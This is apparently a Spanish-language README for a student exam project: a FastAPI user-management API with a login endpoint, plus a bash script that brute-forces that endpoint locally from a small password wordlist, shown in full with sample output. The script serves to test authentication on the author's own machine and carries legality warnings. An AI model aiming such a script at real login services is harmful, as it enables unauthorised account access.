# Practical Term Exam

Este repositorio contiene una API REST (FastAPI) para manejo básico de usuarios (CRUD) y autenticación. Incluye un script `brute.sh` pensado para pruebas locales (simula intentos de login).

---

## Contenido del repositorio

- `main.py` — implementación FastAPI con modelos en `sqlmodel` y almacenamiento en memoria (`users_db`).
- `brute.sh` — script bash que prueba múltiples contraseñas contra `http://127.0.0.1:8000/`.
- `requirements.txt` — dependencias: `fastapi`, `uvicorn`, `sqlmodel`.
- `.gitignore` — (recomendado) para evitar subir `venv/`, `__pycache__/`, etc.

---

## Estructura (actual)
```
practical-term-exam/
├── main.py
├── brute.sh
├── requirements.txt
└── (otros archivos opcionales)
```

## Requisitos y preparación

- **Python** 3.10+  
- **pip**
- **(Windows) Git Bash or WSL to run brute.sh**

Se recomienda crear un entorno virtual:

**Windows (PowerShell)**
``` bash
python -m venv venv
venv\Scripts\Activate.ps1
```
**Instalar dependencias**
``` bash 
pip install -r requirements.txt
```
**Cómo ejecutar la API**

Desde la raíz del proyecto, con el entorno virtual activado:
``` bash 
uvicorn main:app --reload --host 0.0.0.0 --port 8000
```
La API quedará accesible en: http://127.0.0.1:8000/

## ENDPOINTS DETECTADOS

- `GET /`  
  Root

- `POST /users`  
  Crear usuario — Body: `username`, `password`, `email?`, `is_active?`

- `GET /users`  
  Listar usuarios (devuelve datos "seguros" sin la contraseña)

- `GET /users/{user_id}`  
  Obtener usuario por id

- `PUT /users/{user_id}`  
  Actualizar usuario — Campos: `username`, `email`, `is_active`

- `DELETE /users/{user_id}`  
  Eliminar usuario

- `POST /login`  
  Login con `username` + `password`
  
  ## Ejemplo de login (body JSON)

```json
{ "username": "matias", "password": "matym123" }
````
## Respuesta satisfactoria actual
```json
{ "message": "login successful" }
```
## Respuesta por credenciales inválidas
```json
{ "message": "Invalid credentials" }
```
## Bruteforce / Script de prueba (`brute.sh`)

> **Advertencia:** Este script fue utilizado unicamente con fines educativos, hacer el mismo proceso con equipos de terceros seria considerado algo ilegal

### Versión final brute.sh

```bash
API="http://127.0.0.1:8000/login"
USER="matias"

WORDLIST=(matym123 hola123 adios546 arroz123 pollo123 loco456 hello123 maty123)

attempts=0
start=$(date +%s)

for pwd in "${WORDLIST[@]}"; do
  attempts=$((attempts+1))
  resp=$(curl -s -X POST "$API" \
    -H "accept: application/json" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$USER\",\"password\":\"$pwd\"}")
  echo "[$attempts] Probando '$pwd' -> $resp"
  if [[ "$resp" == *"login successful"* ]]; then
    end=$(date +%s)
    echo "ENCONTRADA: password='$pwd' en $attempts intentos, $((end-start))s"
    exit 0
  fi
  sleep 0.2
done

end=$(date +%s)
echo "NO encontrada tras $attempts intentos en $((end-start))s"
exit 1
```
## Cómo funciona `brute.sh`

`brute.sh` es un script de prueba pensado para entornos locales. Su objetivo es automatizar intentos de login usando una lista de contraseñas (wordlist) para comprobar la lógica de autenticación y bloqueo de la API.

**Resumen del flujo:**
1. Define la URL del endpoint de login (`API`) y el usuario objetivo (`USER`).
2. Define un `WORDLIST` con posibles contraseñas.
3. Recorre cada contraseña:
   - Envía una petición `POST` con `curl` al endpoint `/login`.
   - Lee la respuesta (JSON) y comprueba si contiene la cadena/valor que indica éxito (`"login successful"`) o si hay un campo de bloqueo (`retry_after`).
   - Muestra en consola el intento actual y el resultado parcial.
4. Si encuentra la contraseña correcta, muestra el tiempo total y termina. Si no la encuentra, informa que no se encontró tras todos los intentos.

**Variables importantes dentro del script:**
- `API` — URL del endpoint (ej. `http://127.0.0.1:8000/login`)
- `USER` — nombre de usuario objetivo
- `WORDLIST` — arreglo con las contraseñas a probar
- `attempts` — contador de intentos
- `start` / `end` — tiempo de inicio/fin para medir duración

**Advertencia:** usar solo en entornos locales y con cuentas de prueba. Hacer fuerza bruta contra sistemas de terceros es ilegal.

---

## Uso (rápido)

Dar permisos y ejecutar:
```bash
chmod +x brute.sh
./brute.sh
```
### Ejemplo de salida en consola

#### 1) Contraseña encontrada
```
[1] Probando 'matym123' -> {"message":"Invalid credentials"}
[2] Probando 'hola123' -> {"message":"Invalid credentials"}
[3] Probando 'adios546' -> {"message":"login successful"}
ENCONTRADA: password='adios546' en 3 intentos, 1s
```
#### 2) Contraseña no encontrada
```
[1] Probando 'matym123' -> {"message":"Invalid credentials"}
[2] Probando 'hola123' -> {"message":"Invalid credentials"}
[3] Probando 'adios546' -> {"message":"Invalid credentials"}
[4] Probando 'arroz123' -> {"message":"Invalid credentials"}
[5] Probando 'pollo123' -> {"message":"Invalid credentials"}
[6] Probando 'loco456' -> {"message":"Invalid credentials"}
[7] Probando 'hello123' -> {"message":"Invalid credentials"}
[8] Probando 'maty123' -> {"message":"Invalid credentials"}
NO encontrada tras 8 intentos en 2s
```

